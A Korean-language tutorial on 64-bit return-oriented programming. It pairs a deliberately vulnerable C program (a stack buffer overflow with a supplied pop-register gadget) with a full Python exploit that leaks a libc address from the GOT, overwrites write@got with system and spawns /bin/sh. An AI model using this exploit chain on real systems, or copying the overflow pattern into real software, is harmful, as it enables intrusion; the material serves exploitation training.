64비트 ROP :
    32비트 아키텍쳐에서는 함수 호출시 인자를 스택에 저장하는 반면 64비트 아키텍쳐에서는 함수의 인자를 레지스터와 스택에 저장해 전달합니다.

    call64.c는 64비트 아키텍쳐의 함수 호출 규약을 확인하기 위해 printf 함수에 7개의 인자를 전달하여 호출하는 코드입니다.
    ex) call64.c
        // gcc -o call64 call64.c 
        #include <stdio.h>
        int main()
        {
            printf("%d + %d = %d\n %d + %d = %d\n",1,2,3,4,5,9);
            return 0;
        }

    다음은 call64의 디스어셈블리 결과입니다.
    ex)
        $ gdb call64
        (gdb) disas main
        Dump of assembler code for function main:
            0x0000000000400526 <+0>:	push   rbp
            0x0000000000400527 <+1>:	mov    rbp,rsp
            0x000000000040052a <+4>:	sub    rsp,0x8
            0x000000000040052e <+8>:	push   0x9
            0x0000000000400530 <+10>:	mov    r9d,0x5
            0x0000000000400536 <+16>:	mov    r8d,0x4
            0x000000000040053c <+22>:	mov    ecx,0x3
            0x0000000000400541 <+27>:	mov    edx,0x2
            0x0000000000400546 <+32>:	mov    esi,0x1
            0x000000000040054b <+37>:	mov    edi,0x4005f4
            0x0000000000400550 <+42>:	mov    eax,0x0
            0x0000000000400555 <+47>:	call   0x400400 <printf@plt>
        (gdb) x/s 0x4005f4
        0x4005f4:	"%d + %d = %d\n %d + %d = %d\n"

    printf 함수 호출 이전에 인자를 각각 레지스터와 스택에 넣고 호출합니다.
    디스어셈블리 결과를 보면 64비트에서 함수가 호출될 때 전달되는 인자는 다음과 같습니다.

    rdi,rsi,rdx,rcx,r8,r9 레지스터를 전부 사용하면 다음 인자부터는 스택에 저장합니다.
    64비트 아키텍쳐에서는 pop과 같은 명령어를 통해 함수의 인자를 전달하는 방법으로 ROP를 할 수 있습니다.

    rop64.c에는 스택 버퍼 오버플로우 취약점이 존재합니다.
    ex) rop64.c
        // gcc -o rop64 rop64.c -fno-stack-protector
        #include <stdio.h>
        #include <unistd.h>
        void gadget() {
            asm("pop %rdi");
            asm("pop %rsi");
            asm("pop %rdx");
            asm("ret");
        }
        
        int main()
        {
            char buf[256];
            
            write(1, "Data: ", 6);
            read(0, buf, 1024); 
            return 0;
        }

    익스플로잇의 편의를 위해 rdi,rsi,rdx 레지스터에 각각 원하는 값을 전달할 수 있는 ROP 코드 가젯을 제공했습니다.

    공격 코드를 작성하기에 앞서 objdump를 사용하여 pop rdi; pop rsi; pop rdx; ret 코드 가젯의 주소를 알아내야 합니다.
    ex)
        $ objdump -d rop64 | grep "gadget" -A6
        0000000000400566 <gadget>:
            400566:	55                   	push   %rbp
            400567:	48 89 e5             	mov    %rsp,%rbp
            40056a:	5f                   	pop    %rdi
            40056b:	5e                   	pop    %rsi
            40056c:	5a                   	pop    %rdx
            40056d:	c3                   	retq

    해당하는 코드 가젯은 0x40056a 주소에 존재합니다.
    찾은 코드 가젯을 이용해 write 함수를 호출한 뒤 write@got에 저장되어 있는 값을 출력해서 라이브러리 주소를 알아냅니다. 
    이후, 알아낸 라이브러리 주소를 통해 write@got를 system 함수로 덮어쓰고 "/bin/sh" 문자열을 입력합니다. 
    최종적으로 write 함수를 호출하고 "/bin/sh" 문자열의 주소인 0x601020를 첫 번째 인자로 전달하면 셸을 획득할 수 있습니다.

    라이브러리의 베이스 주소와 system 함수 주소를 계산하기 위해 readelf를 사용하여 오프셋을 알아내야 합니다.
    ex)
        $ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "write"
        W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
            99: 00000000000746c0   466 FUNC    GLOBAL DEFAULT   13 _IO_wdo_write@@GLIBC_2.2.5
            169: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 __write@@GLIBC_2.2.5
            287: 000000000007a390   269 FUNC    GLOBAL DEFAULT   13 _IO_do_write@@GLIBC_2.2.5
            491: 0000000000108040    36 FUNC    GLOBAL DEFAULT   13 process_vm_writev@@GLIBC_2.15
            493: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 __pwrite64@@GLIBC_2.2.5
            851: 00000000000fcfd0    90 FUNC    WEAK   DEFAULT   13 writev@@GLIBC_2.2.5
            1252: 00000000000f5ac0    96 FUNC    GLOBAL DEFAULT   13 __libc_pwrite@@GLIBC_PRIVATE
            1513: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev@@GLIBC_2.10
            1565: 0000000000107700    41 FUNC    GLOBAL DEFAULT   13 eventfd_write@@GLIBC_2.7
            1580: 000000000006e6e0   456 FUNC    WEAK   DEFAULT   13 fwrite@@GLIBC_2.2.5
            1855: 00000000000fd0e0   170 FUNC    GLOBAL DEFAULT   13 pwritev64@@GLIBC_2.10
            2005: 0000000000078b70   171 FUNC    GLOBAL DEFAULT   13 _IO_file_write@@GLIBC_2.2.5
            2025: 000000000006e6e0   456 FUNC    GLOBAL DEFAULT   13 _IO_fwrite@@GLIBC_2.2.5
            2044: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite@@GLIBC_2.2.5
            2103: 00000000000781a0   106 FUNC    GLOBAL DEFAULT   13 fwrite_unlocked@@GLIBC_2.2.5
            2112: 00000000000f5ac0    96 FUNC    WEAK   DEFAULT   13 pwrite64@@GLIBC_2.2.5
            2159: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
        $ readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
            225: 0000000000138810    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
            584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
            1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

    라이브러리의 write와 system 함수 오프셋은 각각 0xf72b0, 0x45390인 것을 알아냈습니다.
    ex) rop64.py
        # rop64.py
        import struct
        import subprocess
        import os
        import pty
        import time
        
        def readline(fd):
            res = ''
            try:
                while True:
                ch = os.read(fd, 1)
                res += ch
                if ch == '\x20':
                    return res
            except:
                raise
        
        def read(fd, n):
            return os.read(fd, n)
        
        def writeline(proc, data):
            try:
                proc.stdin.write(data + "\n")
            except:
                raise
        
        def p64(val):
            return struct.pack("<Q", val)
        
        def u64(data):
            return struct.unpack("<Q", data)[0]
        
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
        
        print `read(out_r, 6)`
        
        # write(1, 0x601018, 8)
        payload  = "A"*264         # buf padding
        payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
        payload += p64(1)          # fd
        payload += p64(0x601018)   # write@got
        payload += p64(8)          # 8 
        payload += p64(0x400430)   # write_plt 
        
        # read(0, 0x601018, 16)
        payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
        payload += p64(0)          # fd
        payload += p64(0x601018)   # write@got
        payload += p64(16)          # 8
        payload += p64(0x400440)   # read@plt
        
        # write(0x601020,0,0)
        payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
        payload += p64(0x601020)   # /bin/sh
        payload += p64(0)          # 0
        payload += p64(0)          # 0
        payload += p64(0x400430)   # write@plt
        
        writeline(s, payload)

    출력된 write@got 값과 라이브러리의 write 함수 오프셋을 계산하여 라이브러리의 베이스 주소를 알아내고, 
    system 함수 오프셋과 덧셈 연산을 하여 system 함수 주소를 알아냈습니다.
    ex)
        # rop64.py 
        import struct
        import subprocess
        import os
        import pty
        import time
        
        def readline(fd):
            res = ''
            try:
                while True:
                ch = os.read(fd, 1)
                res += ch
                if ch == '\x20':
                    return res
            except:
                raise
        
        def read(fd, n):
            return os.read(fd, n)
        
        def writeline(proc, data):
            try:
                proc.stdin.write(data + "\n")
            except:
                raise
        
        def p64(val):
            return struct.pack("<Q", val)
        
        def u64(data):
            return struct.unpack("<Q", data)[0]
        
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./rop64", stdin=subprocess.PIPE, stdout=out_w)
        print `read(out_r, 6)`
        
        # write(1, 0x601010, 8)
        payload  = "A"*264         # buf padding
        payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
        payload += p64(1)          # fd
        payload += p64(0x601018)   # write@got
        payload += p64(8)          # 8 
        payload += p64(0x400430)   # write_plt 
        
        # read(0, 0x601010, 16)
        payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
        payload += p64(0)          # fd
        payload += p64(0x601018)   # write@got
        payload += p64(16)          # 8
        payload += p64(0x400440)   # read@plt
        
        # write(0x601018,0,0)
        payload += p64(0x40056a)   # pop rdi; pop rsi; pop rdx; ret
        payload += p64(0x601020)   # /bin/sh
        payload += p64(0)          # 0
        payload += p64(0)          # 0
        payload += p64(0x400430)   # write@plt
        
        writeline(s, payload)
        
        libc = u64(read(out_r,8)[:8])
        base = libc - 0xf72b0
        system = base + 0x45390
        print hex(libc)
        
        writeline(s, p64(system)+"/bin/sh\x00")
        
        while True:
            cmd = raw_input("$ ")
            writeline(s, cmd)
            time.sleep(0.2)
            print read(out_r, 1024)

    write@got에 입력받을 때 system 함수 주소와 "/bin/sh" 문자열을 입력하고,
    write 함수를 호출할 때 인자로 0x601020 주소를 전달하면 셸을 획득할 수 있습니다.
    ex)
        $ python ex.py
        'Data: '
        0x7f98a275c2b0
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)



























